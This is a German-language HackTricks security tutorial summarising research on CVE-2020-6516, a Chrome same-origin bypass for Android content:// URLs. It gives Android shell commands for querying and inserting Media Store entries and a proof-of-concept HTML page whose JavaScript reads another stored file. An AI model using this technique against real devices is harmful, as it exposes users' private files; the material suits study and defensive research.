<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>


**Dies ist eine Zusammenfassung des Beitrags [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)**

### Auflisten von Dateien im Media Store
Um Dateien aufzulisten, die vom Media Store verwaltet werden, kann der folgende Befehl verwendet werden:
```bash
$ content query --uri content://media/external/file
```
F√ºr eine benutzerfreundlichere Ausgabe, die nur den Bezeichner und den Pfad jeder indexierten Datei anzeigt:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
Content-Provider sind in ihrem eigenen privaten Namespace isoliert. Der Zugriff auf einen Provider erfordert die spezifische `content://` URI. Informationen √ºber die Pfade zum Zugriff auf einen Provider k√∂nnen aus den Anwendungsmanifesten oder dem Quellcode des Android-Frameworks abgerufen werden.

### Chroms Zugriff auf Content-Provider
Chrome auf Android kann √ºber das `content://`-Schema auf Content-Provider zugreifen und so auf Ressourcen wie Fotos oder von Drittanbieteranwendungen exportierte Dokumente zugreifen. Um dies zu veranschaulichen, kann eine Datei in den Media Store eingef√ºgt und dann √ºber Chrome darauf zugegriffen werden:

F√ºgen Sie einen benutzerdefinierten Eintrag in den Media Store ein:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
Entdecken Sie die Kennung der neu eingef√ºgten Datei:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
Die Datei kann dann in Chrome angezeigt werden, indem eine URL mit der Kennung der Datei erstellt wird.

Zum Beispiel, um Dateien im Zusammenhang mit einer bestimmten Anwendung aufzulisten:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Same-Origin-Policy Bypass

Die _Same Origin Policy_ (SOP) ist ein Sicherheitsprotokoll in Browsern, das verhindert, dass Webseiten auf Ressourcen aus verschiedenen Urspr√ºngen zugreifen, es sei denn, dies wird explizit durch eine Cross-Origin-Resource-Sharing (CORS) Richtlinie erlaubt. Diese Richtlinie soll Informationslecks und Cross-Site Request Forgery verhindern. Chrome betrachtet `content://` als lokales Schema, was strengere SOP-Regeln impliziert, wobei jede URL mit lokalem Schema als separater Ursprung behandelt wird.

Jedoch war CVE-2020-6516 eine Sicherheitsl√ºcke in Chrome, die einen Umgehung der SOP-Regeln f√ºr √ºber eine `content://` URL geladene Ressourcen erm√∂glichte. In der Praxis konnte JavaScript-Code von einer `content://` URL auf andere √ºber `content://` URLs geladene Ressourcen zugreifen, was ein erhebliches Sicherheitsrisiko darstellte, insbesondere auf Android-Ger√§ten mit Versionen vor Android 10, wo der Scoped Storage nicht implementiert war.

Der unten stehende Proof-of-Concept demonstriert diese Sicherheitsl√ºcke, bei der ein HTML-Dokument, nachdem es unter **/sdcard** hochgeladen und zur Media Store hinzugef√ºgt wurde, `XMLHttpRequest` in seinem JavaScript verwendet, um auf den Inhalt einer anderen Datei im Media Store zuzugreifen und diesen anzuzeigen, wobei die SOP-Regeln umgangen werden.

Proof-of-Concept HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
